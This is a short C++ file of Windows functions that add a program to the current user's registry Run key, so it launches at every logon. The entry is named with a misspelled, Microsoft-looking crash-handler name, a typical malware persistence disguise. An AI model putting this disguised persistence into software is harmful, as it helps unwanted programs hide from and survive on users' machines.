#include <windows.h>
#include <iostream>
#include <string>

bool IsAlreadyInStartup(const std::string& programPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

    if (result != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key. Error: " << result << std::endl;
        return false;
    }

    char buffer[MAX_PATH];
    DWORD bufferSize = sizeof(buffer);
    result = RegQueryValueExA(hKey, "MicorsoftWindowsCrashHandlerv83", nullptr, nullptr, (BYTE*)buffer, &bufferSize);

    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        if (programPath == std::string(buffer)) {
            std::cout << "Program is already in startup." << std::endl;
            return true;
        }
    }

    return false;
}

bool AddToStartup(const std::string& programPath) {
    if (IsAlreadyInStartup(programPath)) {
        return true; // Already in startup, no need to add again
    }

    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (result != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key. Error: " << result << std::endl;
        return false;
    }

    result = RegSetValueExA(hKey, "MicorsoftWindowsCrashHandlerv83", 0, REG_SZ, (BYTE*)programPath.c_str(), programPath.size() + 1);

    if (result != ERROR_SUCCESS) {
        std::cerr << "Failed to set registry value. Error: " << result << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    std::cout << "Program added to startup successfully!" << std::endl;
    return true;
}
